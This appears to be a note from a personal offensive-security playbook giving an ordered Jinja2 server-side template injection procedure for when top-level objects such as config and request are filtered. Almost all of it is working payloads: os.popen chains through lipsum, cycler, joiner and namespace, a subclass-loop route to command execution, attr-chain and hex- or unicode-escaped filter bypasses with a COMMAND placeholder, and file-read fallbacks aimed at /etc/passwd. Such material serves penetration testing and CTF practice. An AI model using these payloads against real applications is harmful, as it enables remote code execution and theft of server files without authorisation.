
## Goal

Land here because top-level objects (`config`, `request`) are blocked but syntax works (e.g. `{{7*7}}` → `49`, `{{''.__ class__}}` renders something).

Goal: gain the first useful primitive via context-free globals or filter bypasses, record the exact working chain, then route to [[Jinja2 SSTI - Post-Primitive Workflow]].

## 1. Context-free globals → os → popen

These objects (`lipsum`, `cycler`, `joiner`, `namespace`) are available in Jinja2's default context and bypass most top-level object filters.

**Test in order:**

**1a.** `{{lipsum.__globals__['os'].popen('id').read()}}`

**1b.** `{{cycler.__init__.__globals__['os'].popen('id').read()}}`

**1c.** `{{joiner.__init__.__globals__['os'].popen('id').read()}}`

**1d.** `{{namespace.__init__.__globals__['os'].popen('id').read()}}`

- Any returns output (e.g. `uid=...`) → **RCE** confirmed → record working command information and go to [[Jinja2 SSTI - Post-Primitive Workflow]] 
  i. Primitive type: `RCE` 
  ii. Exact working prefix/chain: e.g. `lipsum.__globals__['os'].` (record whichever worked) iii. Pattern that worked: `popen('id').read()`
- All blocked / empty / error → record exact responses → go to 2

## 2. Context-free globals → builtins → import (if os not in globals)

Same objects, but forcing import through builtins in case `os` is not already in the global namespace.

**Test in order:**

**2a.** `{{lipsum.__globals__['__builtins__']['__import__']('os').popen('id').read()}}`

**2b.** `{{cycler.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}`

**2c.** `{{joiner.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}`

**2d.** `{{namespace.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}`

- Any returns output (e.g. `uid=...`) → **RCE** confirmed → record working command information and go to [[Jinja2 SSTI - Post-Primitive Workflow]] 
  i. Primitive type: `RCE` 
  ii. Exact working prefix/chain: e.g. `lipsum.__globals__['__builtins__']['__import__']('os').` (record whichever worked) 
  iii. Pattern that worked: `popen('id').read()`
- All blocked / empty / error → record exact responses → go to 3

## 3. Subclasses RCE (warning loop)

`{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').popen('id').read() }}{% endif %}{% endfor %}`

- Output (e.g. `uid=...`) → **RCE** confirmed → record working command information and go to [[Jinja2 SSTI - Post-Primitive Workflow]] 
  i. Primitive type: `RCE` 
  ii. Exact working prefix/chain: `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').` 
  iii. Pattern that worked: `warning loop/trick`
- No output / error → record exact response → go to 4

## 4. Filter bypasses (when `.` `[` `]` `_` are partially or fully blocked)

Work through these in order. Each targets a different filter restriction.

> [!note] Do not forget to replace `COMMAND` with the actual shell command that you want to execute.

**4a. `|attr()` chain** (bypasses dot notation blocks): `{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('COMMAND')|attr('read')()}}`

**4b. Hex-escaped dunders** (bypasses underscore filters): `{{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('COMMAND')|attr('read')()}}`

**4c. Unicode-escaped dunders** (alternative to 4b — try if hex escaping is also filtered): `{{request|attr('\u005f\u005fclass\u005f\u005f')|attr('\u005f\u005finit\u005f\u005f')|attr('\u005f\u005fglobals\u005f\u005f')|attr('\u005f\u005fgetitem\u005f\u005f')('\u005f\u005fbuiltins\u005f\u005f')|attr('\u005f\u005fgetitem\u005f\u005f')('\u005f\u005fimport\u005f\u005f')('os')|attr('popen')('COMMAND')|attr('read')()}}`

- Any returns output (e.g. `uid=...`) → **RCE** confirmed → record working command information and go to [[Jinja2 SSTI - Post-Primitive Workflow]] 
  i. Primitive type: `RCE` 
  ii. Exact payload that worked (**note in this instance you have the whole payload to take to `Post-Primitive Workflow` not just the `PREFIX/CHAIN`** variable)
  iii. Pattern that worked: `attr chain | hex escape | unicode escape`
- All blocked → go to 5

## 5. File read fallback (when all RCE paths fail)

### 5.1 Context-free globals → open

**Test in order:**

1. `{{lipsum.__globals__['__builtins__']['open']('/etc/passwd').read()}}`
2. `{{cycler.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}`
3. `{{joiner.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}`
4. `{{namespace.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}`

> [!note] Replace `/etc/passwd` with other absolute file paths you may wish to read.

- Output looks like genuine file contents → SUCCESS 
  i. Primitive type: `file-read` 
  ii. Exact working prefix/chain: e.g. `lipsum.__globals__['__builtins__']['open']` (record whichever worked) 
  iii. Pattern that worked: `('/etc/passwd').read()` → [[Jinja2 SSTI - Post-Primitive Workflow#**4. File operations (only if primitive = file-read)** Use the exact file-read chain you recorded (with your working INDEX).]]
- All blocked / empty / error → record exact responses → go to 5.2

### 5.2 Subclasses file read

**Step 1 — dump subclasses:**

`{{''.__class__.__mro__[1].__subclasses__()}}`

**Step 2 — search for the following classes in the subclass dump:**

| Category          | Class Search Terms                                |
| ----------------- | ------------------------------------------------- |
| DIRECT PATH       | TextIOWrapper, FileIO, BufferedReader             |
| GLOBALS CHAIN     | FileWrapper, _TemporaryFileWrapper, TemporaryFile |
| STREAM ACCESS     | FileStorage                                       |
| ARCHIVE           | ZipFile                                           |
| FRAMEWORK HELPERS | _SharedFile, _Tellable                            |

> [!note] You are not necessarily looking for the Class Search Terms to be exact class names, as some class names can be class chains. For example, searching for `FileWrapper` may return `werkzeug.wsgi.FileWrapper`.

List all found class matches, their indices (indexed from zero), and their associated Category from the table above.

**Step 3 — test by category**, replacing `N` with the appropriate index:

| Category          | Payload                                                                                                              |
| ----------------- | -------------------------------------------------------------------------------------------------------------------- |
| DIRECT PATH       | `{{''.__class__.__mro__[1].__subclasses__()[N]('/etc/passwd').read()}}`                                              |
| GLOBALS CHAIN     | `{{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}` |
| STREAM ACCESS     | `{{''.__class__.__mro__[1].__subclasses__()[N]('filename','/etc/passwd').stream.read()}}`                            |
| ARCHIVE           | `{{''.__class__.__mro__[1].__subclasses__()[N]('/etc/passwd').read()}}`                                              |
| FRAMEWORK HELPERS | `{{''.__class__.__mro__[1].__subclasses__()[N]('/etc/passwd').read()}}`                                              |

> [!note] Replace `/etc/passwd` with other absolute file paths you may wish to read.

- Any works → SUCCESS 
  i. Primitive type: `file-read` 
  ii. Exact working chain: `''.__class__.__mro__[1].__subclasses__()[N]` (the part before `('/etc/passwd').read()`) 
  iii. Pattern that worked: `DIRECT PATH | GLOBALS CHAIN | STREAM ACCESS` etc. → [[Jinja2 SSTI - Post-Primitive Workflow#**4. File operations (only if primitive = file-read)** Use the exact file-read chain you recorded (with your working INDEX).]]
- All blocked → no further fallbacks → leave this note and re-evaluate attack surface